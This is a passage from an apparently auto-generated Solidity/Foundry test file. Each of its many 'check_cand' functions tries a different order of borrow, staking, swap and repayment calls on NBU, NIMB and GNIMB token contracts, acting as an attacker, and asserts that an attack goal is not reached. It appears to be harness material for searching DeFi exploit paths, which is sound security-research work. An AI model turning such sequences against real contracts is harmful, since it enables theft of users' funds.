        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand590(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand591(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand592(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand593(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand594(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand595(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand596(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand597(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand598(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand599(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand600(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand601(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand602(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand603(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand604(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand605(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand606(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand607(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand608(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand609(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand610(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand611(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand612(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand613(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand614(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand615(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand616(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand617(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand618(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand619(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand620(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand621(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand622(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand623(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand624(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand625(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand626(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand627(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand628(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand629(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand630(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand631(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand632(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand633(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand634(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand635(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand636(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand637(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand638(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand639(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand640(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand641(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand642(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand643(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand644(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
